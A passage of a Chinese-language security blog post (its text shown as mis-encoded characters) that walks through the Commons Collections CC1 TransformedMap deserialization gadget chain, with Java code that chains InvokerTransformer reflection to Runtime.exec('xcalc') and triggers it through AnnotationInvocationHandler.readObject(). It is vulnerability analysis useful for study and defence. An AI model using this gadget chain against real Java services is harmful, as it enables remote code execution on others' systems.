class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤gadgetså¤§è‡´åˆ†æå®Œæ¯•ï¼Œè¯»è€…å¯ä»¥åŠ¨æ‰‹è°ƒè¯•ä¸€ä¸‹ï¼ŒåŠ æ·±ç†è§£ã€‚</p><br><h3 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h3><ol><li>InvokerTransformerç±»çš„ <code>transform()</code> æ–¹æ³•ä¸­å­˜åœ¨å¯æ§çš„åå°„æ“ä½œï¼Œè¿™ä¸ªæ“ä½œå°±æ˜¯è¿™ä¸ªé“¾å­çš„æ¼æ´ç‚¹ã€‚</li><li>Pocä¸­gadgetsçš„æœ€åè°ƒç”¨äº† <code>TransformedMap.decorate()</code>ï¼Œè¯¥æ–¹æ³•è¿”å›TransformedMapç±»å®ä¾‹ã€‚ TransformedMapç±»ä¸­ è°ƒç”¨ æŒ‡å®šç±»<code>transform()</code>  çš„æ“ä½œåªæœ‰ <code>checkSetValue()</code> , <code>transformKey()</code> å’Œ <code>transformValue()</code> æ–¹æ³•ä¸­å­˜åœ¨</li><li>æ ¹æ® 1. å’Œ 2. å¹¶ç»“åˆPocæ¥è¿›è¡Œæ¨æµ‹ï¼šè¯¥Pocåœ¨è¯•å›¾è°ƒç”¨åˆ° <code>TransformedMap.checkSetValue()</code> , <code>TransformedMap.transformKey()</code> , <code>TransformedMap.transformValue()</code> è¿™ä¸‰è€…ä¹‹ä¸€æ¥æ‰§è¡Œ <code>InvokerTransformer.transform()</code>ï¼Œä»è€ŒRCEã€‚</li></ol><h3 id="åˆ†ægadgets"><a href="#åˆ†ægadgets" class="headerlink" title="åˆ†ægadgets"></a>åˆ†ægadgets</h3><p>è¿™ä¸€èŠ‚æˆ‘ä»¬ä»…åˆ†æ gadgetsï¼Œç›®çš„æ˜¯ç†è§£ gadgets ä¸­å¦‚ä½•è§¦å‘åˆ°RCEçš„ï¼ˆè¿™ä¸ªæ¼æ´çš„RCEç‚¹æ˜¯ InvokerTransformerç±»çš„ <code>transform()</code> æ–¹æ³•ï¼‰ã€‚æ‰€ä»¥æˆ‘ä»¬å…ˆä¸æ‰¾ååºåˆ—åŒ–å…¥å£ç‚¹ï¼Œå…ˆæ‰‹å·¥è°ƒç”¨ gadgetsæ‰‹å·¥è§¦å‘RCEï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;Runtime.class,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">        <span class="comment">//Runtime.exec() æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">        <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//é€šè¿‡è°ƒç”¨ TransformedMap.put() æ¥è§¦å‘</span></span><br><span class="line">outerMap.put(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;tt&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç®€å•ç”»äº†ä¸ªæµç¨‹å›¾ï¼Œå½“ç„¶è‡ªå·±åŠ¨æ‰‹è·Ÿä»£ç ç†è§£èµ·æ¥æ•ˆæœæ›´å¥½</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/1.png" width="1000px"><br><h4 id="å…³äº-InvokerTransformer-åå°„è°ƒç”¨çš„ç»†èŠ‚"><a href="#å…³äº-InvokerTransformer-åå°„è°ƒç”¨çš„ç»†èŠ‚" class="headerlink" title="å…³äº InvokerTransformer åå°„è°ƒç”¨çš„ç»†èŠ‚"></a>å…³äº InvokerTransformer åå°„è°ƒç”¨çš„ç»†èŠ‚</h4><p>ä¼°è®¡å¤§å®¶éƒ½çœ‹åˆ°äº†ï¼ŒPocä¸­ä¸ºäº†æ‰§è¡Œ <code>xcalc</code>å‘½ä»¤ï¼Œè¿ç»­ç”¨äº†ä¸‰æ¬¡<code>InvokerTransformer()</code>æ‰å¾—è§£ã€‚ä¸ºä»€ä¹ˆéœ€è¦è°ƒç”¨é‚£ä¹ˆå¤šæ¬¡å‘¢ï¼Ÿ</p><p><strong>é¦–å…ˆï¼Œ</strong>æˆ‘ä»¬å¾—å…ˆäº†è§£ä¸‹ï¼Œ<code>.class</code>ï¼›<code>.class.getClass()</code>ï¼›<code>å®ä¾‹.getClass()</code> ä¹‹é—´éƒ½æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥æµ‹è¯•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Runtime.class); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">System.out.println(Runtime.class.getClass()); <span class="comment">//class java.lang.Class</span></span><br><span class="line">System.out.println(Runtime.getRuntime().getClass()); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">System.out.println(Runtime.getRuntime().getClass().getClass()); <span class="comment">//class java.lang.Class</span></span><br></pre></td></tr></table></figure><br><p>äº†è§£å®Œæ¯•åå›åˆ°æ¼æ´ä¸Šæ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ï¼ŒPayloadéœ€è¦è¢«åºåˆ—åŒ–ã€‚è‹¥æˆ‘ä»¬ç›´æ¥ç»™ ConstantTransformerç±»ä¼ å…¥ <code>Runtime.getRuntime()</code> ï¼Œä¼šç”±äº Runtime æ²¡æœ‰å®ç° Serializable æ¥å£è€Œåœ¨åºåˆ—åŒ–æ—¶æŠ¥é”™ã€‚</p><p>æ‰€ä»¥ä¸ºäº†èƒ½å¤Ÿè®© <code>InvokerTransformer.transform()</code> åå°„ Runtimeç±»ã€‚Pocä¸­é‡‡å–äº†æŠ˜ä¸­çš„åŠæ³•ï¼Œè¿™é‡Œå°†Pocå’ŒInvokerTransformeræŠ½è±¡æˆä¸‹é¢çš„ä»£ç ï¼Œæ–¹ä¾¿ç†è§£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å¾—ä¸€ä¸ªClasså¯¹è±¡</span></span><br><span class="line">Class aClass = Runtime.class.getClass();</span><br><span class="line"><span class="comment">//è¿™é‡Œçš„getMethodæ˜¯ä¸ºäº†å’Œä¸‹æ–‡çš„ aClass1 æ‰“é…åˆ</span></span><br><span class="line">Method getMethod = aClass.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">Object getRuntime = getMethod.invoke(Runtime.class, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//ä»¥ä¸Šä¸‰è¡Œæ“ä½œç›¸å½“äº:</span></span><br><span class="line"><span class="comment">//Method getRuntime1 = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">System.out.println(getRuntime); <span class="comment">//public static java.lang.Runtime java.lang.Runtime.getRuntime()</span></span><br><span class="line">System.out.println(getRuntime.getClass()); <span class="comment">//class java.lang.reflect.Method</span></span><br><span class="line"> </span><br><span class="line">Class aClass1 = getRuntime.getClass();</span><br><span class="line">Method invoke = aClass1.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;);</span><br><span class="line">Object invoke1 = invoke.invoke(getRuntime, <span class="keyword">new</span> Object[]&#123;Runtime.class, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//ä»¥ä¸Šä¸‰è¡Œæ“ä½œç›¸å½“äº:</span></span><br><span class="line"><span class="comment">//Object invoke3 = getRuntime.invoke(Runtime.class);</span></span><br><span class="line">System.out.println(invoke1); <span class="comment">//java.lang.Runtime@14ae5a5</span></span><br><span class="line">System.out.println(invoke1.getClass()); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line">Class aClass2 = invoke1.getClass();</span><br><span class="line">Method exec = aClass2.getMethod(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;);</span><br><span class="line">Object invoke2 = exec.invoke(invoke1, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>è‡³æ­¤gadgetså°±åˆ†æå®Œäº†ï¼Œæ¥ä¸‹æ¥å¼€å§‹å¯»æ‰¾èƒ½å¤Ÿè·³åˆ° TransformedMapè§¦å‘ç‚¹ çš„ååºåˆ—åŒ–å…¥å£ç‚¹äº†ã€‚</p><br><h1 id="readObject-AnnotationInvocationHandler"><a href="#readObject-AnnotationInvocationHandler" class="headerlink" title="readObject() - AnnotationInvocationHandler"></a>readObject() - AnnotationInvocationHandler</h1><p>gadgetsè¿™ä¸€èŠ‚æœ€åè¯´ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾è°ƒç”¨å…¥å£ç‚¹ï¼Œæ‰¾åˆ°èƒ½å¤Ÿè°ƒç”¨ <code>TransformedMap</code>ç±»æ–¹æ³•çš„ç‚¹ã€‚</p><p>æ ¹æ®Pocå‘ç°å…¶åºåˆ—åŒ–äº† <code>sun.reflect.annotation.AnnotationInvocationHandler</code>ç±»ï¼Œå¹¶å°† gadgetsä¸­æœ€åä¸€è¡Œç»è¿‡ <code>TransformedMap.decorate()</code> ä¿®é¥°çš„ <code>Map outerMap</code> ä¼ å…¥å…¶æ„é€ æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = declaredConstructor.newInstance(Retention.class, outerMap);</span><br><span class="line">....<span class="comment">//å¯¹ o è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œ</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ¼æ´æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å½“å»ç„ç„ AnnotationInvocationHandlerç±»çš„ <code>readObject()</code>æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.reflect.annotation;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    </span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//è°ƒç”¨äº†setValue()ã€‚ </span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥<code>readObject()</code> çš„æµç¨‹ï¼Œå¯åˆ†ä¸ºä¸¤ä¸ªå¹¶è¡Œåˆ†æ”¯ï¼š</p><ol><li>è°ƒç”¨åˆ° TransformedMap çš„ä»£ç  <code>setValue()</code>ï¼Œä»–æ˜¯å¦‚ä½•è°ƒç”¨åˆ° TransformedMap çš„ï¼Ÿ</li><li>è¿›å…¥ <code>setValue()</code>ä¹‹å‰æœ‰ä¸€åˆ¤æ–­ <code>if (var7 != null)</code>ï¼Œå¦‚ä½•ç¡®ä¿ä¸€å®šèƒ½è¿›å…¥è¿™ä¸ªåˆ†æ”¯ï¼Ÿ</li></ol><br><h2 id="å¦‚ä½•è°ƒç”¨åˆ°TransformedMap"><a href="#å¦‚ä½•è°ƒç”¨åˆ°TransformedMap" class="headerlink" title="å¦‚ä½•è°ƒç”¨åˆ°TransformedMap"></a>å¦‚ä½•è°ƒç”¨åˆ°TransformedMap</h2><p>æˆ‘ä»¬å‘ç° <code>readObject()</code>æ–¹æ³• ä¸­å’Œ <code>setValue()</code> ç›¸å…³çš„ç±»æˆå‘˜æ˜¯ Mapç±»å‹çš„<code>memberValues</code>ã€‚è€ŒPocå¼ºåˆ¶å®ä¾‹åŒ– AnnotationInvocationHandlerç±» æ—¶å°±å°† <code>memberValues</code> è®¾ç½®ä¸º TransformedMapç±»å‹çš„ <code>outerMap</code>äº†ã€‚æ‰€ä»¥ AnnotationInvocationHandlerç±» ä¸­å¯¹ var4ã€var5 çš„æ“ä½œæˆ‘ä»¬å»åˆ° TransformedMapç±»å»çœ‹æºç å’Œè°ƒè¯•å³å¯ã€‚</p><p>TransformedMap å…³ç³»å›¾å¦‚ä¸‹ï¼ˆçº¢åœ†ç‚¹æ˜¯å…³é”®ç±»ï¼‰ï¼š</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/2.png" width="600px"><p>ç»è¿‡è°ƒè¯•å’Œä»£ç è¿½è¸ªå¯äº†è§£åˆ°è§¦å‘æµç¨‹ï¼š</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/3.png" width="1000px"><br><h2 id="å¦‚ä½•è¿›å…¥ifåˆ¤æ–­"><a href="#å¦‚ä½•è¿›å…¥ifåˆ¤æ–­" class="headerlink" title="å¦‚ä½•è¿›å…¥ifåˆ¤æ–­"></a>å¦‚ä½•è¿›å…¥ifåˆ¤æ–­</h2><p>è¿›å…¥ ifåˆ¤æ–­ çš„ä»£ç ä¸­ï¼Œæœ‰å‡ ä¸ªé‡è¦çš„å˜é‡ã€‚å…·ä½“è¿™äº›å˜é‡æ˜¯å¦‚ä½•è¢«èµ‹å€¼çš„å°±ä¸è¯¦ç»†å†™å‡ºæ¥äº†ï¼Œè‡ªè¡Œè·Ÿè¿›ä¸€ä¸‹ä»£ç å°±èƒ½çŸ¥é“ã€‚æˆ‘ä¹Ÿä¸æƒ³æŠŠä¸€å †ç¯‡å¹…å†™åœ¨è·Ÿç€ä»£ç è·³æ¥è·³å»ä¸Šã€‚è¿™é‡Œä»…è¯´æ€è·¯å’Œæµç¨‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åœ¨Pocä¸­ï¼Œä¸€äº›ç±»æˆå‘˜å·²ç»è¢«èµ‹å€¼ï¼š</span></span><br><span class="line"><span class="comment">//this.memberValues ä¸º TransformerMap</span></span><br><span class="line"><span class="comment">//this.type ä¸º Retention.class</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œæ˜¯æ³¨è§£çš„æ“ä½œ</span></span><br><span class="line">AnnotationType var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line"><span class="comment">//è·å–æ³¨è§£ä¸­ æ‰€æœ‰æ–¹æ³• åŠå…¶ è¿”å›å€¼ çš„Map</span></span><br><span class="line">Map var3 = var2.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–TransformerMap iterator</span></span><br><span class="line">Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Entry var5 = (Entry)var4.next();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è·å– TransformerMap çš„key</span></span><br><span class="line">    String var6 = (String)var5.getKey();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æŸ¥çœ‹Retentionæ˜¯å¦æœ‰æ–¹æ³•åä¸ºvar6çš„æ–¹æ³•</span></span><br><span class="line">    <span class="comment">//Retentionæ³¨è§£åªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼šRetentionPolicy value()</span></span><br><span class="line">    <span class="comment">//æ‰€ä»¥var6å¿…é¡»ä¸º &quot;value&quot; æ‰èƒ½é¡ºåˆ©è·å¾— var7</span></span><br><span class="line">    Class var7 = (Class)var3.get(var6);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object var8 = var5.getValue();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//åªè¦TransformerMapçš„valueä¸æ˜¯RetentionPolicyç±»å‹å°±æ²¡æœ‰é—®é¢˜</span></span><br><span class="line">        <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            var5.setValue(.....);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹è¿™ä¸€èŠ‚ï¼Œå…¶å®è¿™ä¸ªifåˆ¤æ–­çš„æ€æƒ³æ˜¯ï¼šåªæœ‰Mapçš„keyå€¼å’Œæ³¨è§£çš„æ–¹æ³•åä¸€è‡´ï¼Œæ‰ä¼šè°ƒç”¨ <code>setValue()</code>ã€‚</p><br><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>CC1 TransformedMap é“¾çš„æ ¸å¿ƒæ€è·¯å¦‚ä¸‹ï¼š</p><ol><li><p><code>InvokerTransformer.transform()</code> ä¸­å­˜åœ¨å¯æ§çš„åå°„æ“ä½œ</p></li><li><p><code>ChainedTransformer.transform()</code> å¯¹ <code>Transformer[]</code> éå†è°ƒç”¨ <code>transform()</code>ï¼Œä¸ºæ‰§è¡Œå¤šæ®µåå°„æä¾›äº†å¯èƒ½</p></li><li><p>æ‰§è¡Œåˆ° <code>ChainedTransformer.transform()</code> çš„å…¥å£ä¸º:</p><p><code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code></p></li><li><p>ååºåˆ—åŒ–å…¥å£ç‚¹ ä¸º <code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>ï¼Œè¯¥æ–¹æ³•æ‰§è¡Œäº† å¯æ§Mapç±»å‹ ç±»æˆå‘˜çš„ <code>setValue()</code> æ“ä½œ</p></li></ol><p>æœ€åæä¸€ä¸‹ï¼Œ<strong>jdk &gt;= 8u71</strong> è¿™æ¡é“¾å­å°±å¤±æ•ˆäº†ã€‚è¿™æ˜¯å› ä¸º AnnotationInvocationHandlerç±»çš„ <code>readObject()</code> ä»£ç æœ‰å˜åŒ–ã€‚åŸæœ¬çš„ <code>setValue()</code> æ²¡äº†ã€‚å”¯ä¸€æœ‰ç‚¹å¸Œæœ›çš„ <code>var7.put(var10, var11)</code> ç»“æœ var7 æ˜¯ä¸ªæ–°newçš„LinkedHashMapï¼Œä¸å¯æ§ã€‚æ‰€ä»¥å°±å†‡å¾—äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField var2 = var1.readFields();</span><br><span class="line">    Class var3 = (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//var4å°±æ˜¯ååºåˆ—åŒ–æ—¶çš„å±æ€§ memberValues</span></span><br><span class="line">    Map var4 = (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var6 = var5.memberTypes();</span><br><span class="line">    <span class="comment">//é¦–å…ˆï¼Œvar7æ˜¯æ–°newçš„ä¸€ä¸ªLinkedHashMap()ï¼Œä¸å¯æ§</span></span><br><span class="line">    LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        <span class="comment">//å…¶æ¬¡è°ƒç”¨çš„æ˜¯ AbstractInputCheckedMapDecorator.MapEntry.next()</span></span><br><span class="line">        Entry var9 = (Entry)var8.next();</span><br><span class="line">        <span class="comment">//å¯æƒœè¿™é‡ŒgetKey()å¹¶ä¸èƒ½è§¦å‘åˆ° TransformedMap</span></span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="keyword">null</span>;</span><br><span class="line">        Class var12 = (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//å¯æƒœè¿™é‡ŒgetValue()ä¹Ÿä¸èƒ½è§¦å‘åˆ° TransformedMap</span></span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ol><li><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/">Java Class Object</a></li><li>ã€ä»£ç å®¡è®¡ã€‘çŸ¥è¯†æ˜Ÿçƒ - 